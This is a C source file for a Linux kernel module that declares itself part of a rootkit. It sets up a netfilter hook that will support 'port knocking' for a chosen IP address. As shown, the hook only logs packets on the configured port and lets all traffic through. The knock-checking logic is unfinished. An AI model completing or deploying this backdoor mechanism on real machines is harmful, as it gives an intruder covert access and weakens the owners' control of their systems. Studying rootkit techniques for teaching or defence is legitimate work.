
/*
 * This file provides all the functionality needed for port knocking.
 */
#include <net/ip.h>
#include <linux/inet.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>

#include "include.h"
#include "main.h"

/* information for netfilter hooks */
static struct nf_hook_ops hook;

/* the port for which knocking is enabled */
static unsigned int port;

/* the ip address which is allowed to connect */
static u8 ip[4];

/* 
 * The Netfilter hook function
 * It is of type nf_hookfn (see netfilter.h)
 */
unsigned int
knocking_hook (const struct nf_hook_ops *ops,
	struct sk_buff *skb,
	const struct net_device *in,
	const struct net_device *out,
	int (*okfn)(struct sk_buff *))
{
	struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
	struct tcphdr *tcp_header;
	struct udphdr *udp_header;

	if (ip_header->protocol == 6) {		/* tcp */
		tcp_header = (struct tcphdr *) skb_transport_header(skb);
		
		if(ntohs(tcp_header->dest) == port) {
			ROOTKIT_DEBUG("Received packet on filtered tcp port %u.\n", port);
		}
	}

	if (ip_header->protocol == 17) {	/* udp */
		udp_header = (struct udphdr *) skb_transport_header(skb);
		
		if(ntohs(udp_header->dest) == port) {
			ROOTKIT_DEBUG("Received packet on filtered udp port %u.\n", port);
		}
	}

	/* let the packet through */
	return NF_ACCEPT;
}

/* enable port knocking */
int
load_port_knocking (char *ipv4_addr, unsigned int port_number)
{
	int ret;
	
	ROOTKIT_DEBUG("Starting to load the port knocking...\n");
	
	/* convert ip string to an int array */
	in4_pton(ipv4_addr, -1, ip, -1, NULL);

	/* copy the port number */
	port = port_number;

	/* setup everything for the netfilter hook */
	hook.hook = knocking_hook;		/* our function */
	hook.hooknum = NF_INET_PRE_ROUTING;	/* grab everything that comes in */
	hook.pf = PF_INET; 			/* we only care about ipv4 */
	hook.priority = NF_IP_PRI_FIRST;	/* respect my prioritah */

	/* actually do the hook */
	ret = nf_register_hook(&hook);

	if(ret < 0) {
		ROOTKIT_DEBUG("Error enabling port knocking. Return of nf_register_hook = %d\n", ret);
		return ret;
	}

	/* log our success */
	ROOTKIT_DEBUG("Done.\n");
	return 0;
}

/* disable port knocking */
void
unload_port_knocking (void)
{
	ROOTKIT_DEBUG("Starting to unload the port knocking...\n");

	/* unregister the netfilter hook */
	nf_unregister_hook(&hook);

	ROOTKIT_DEBUG("Done.\n");
}
